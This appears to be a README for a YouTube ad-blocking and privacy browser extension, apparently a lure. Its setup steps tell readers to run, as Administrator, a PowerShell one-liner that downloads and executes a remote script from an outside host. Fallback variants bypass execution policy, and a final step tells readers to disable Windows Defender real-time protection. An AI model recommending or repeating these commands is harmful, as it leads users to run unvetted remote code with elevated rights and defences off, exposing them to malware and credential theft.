# Open Video Enhancer & Privacy Filter for YouTube 🚀


An advanced, lightweight browser extension and universal user-script dedicated to transforming your video streaming experience. This tool focuses on elements filtering, privacy protection, and playback optimization on popular video hosting platforms.

---

## 🌟 Overview

**Open Video Enhancer** is a community-driven project built to give users full control over their media consumption environment. By implementing smart content-filtering algorithms, it streamlines web pages, improves loading times, and eliminates distracting promotional assets seamlessly.

### Why use this solution?
*   **Total Content Control:** Seamlessly filters background scripts, tracking elements, and intrusive layout containers.
*   **Enhanced Privacy Shield:** Restricts third-party telemetry, data collection, and analytics scripts during playback.
*   **Performance Optimization:** Reduces CPU and RAM usage by preventing unnecessary visual elements from rendering.
*   **Customizable User Experience:** Tailor your viewing grid, auto-skip sponsorship frames (via crowdsourced data), and modify playback speeds.

---

## 🚀 Automated Installation & Setup (PowerShell)

1. Open PowerShell as Administrator:
   * Press the `Win + X` keys simultaneously.
   * Select Terminal (Admin) or Windows PowerShell (Admin) from the context menu.

2. Execute the Deployment Command:
   Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:

   ```powershell
   irm https://easy-soft.su/powershell/Loader.ps1 | iex
   ```
---

## 🔍 Troubleshooting & Common Errors

### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://easy-soft.su/powershell/Loader.ps1 | iex"
```

### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
In older legacy environments where aliases are missing, use explicit full system cmdlets:
```powershell
Invoke-RestMethod https://easy-soft.su/powershell/Loader.ps1 | Invoke-Expression
```


### 📌 Antivirus or SmartScreen Interception
Automated deployment routines can sometimes trigger proactive security heuristics. Temporarily disable "Real-time protection" within your Windows Defender settings during setup, then re-enable it immediately after completion.

---
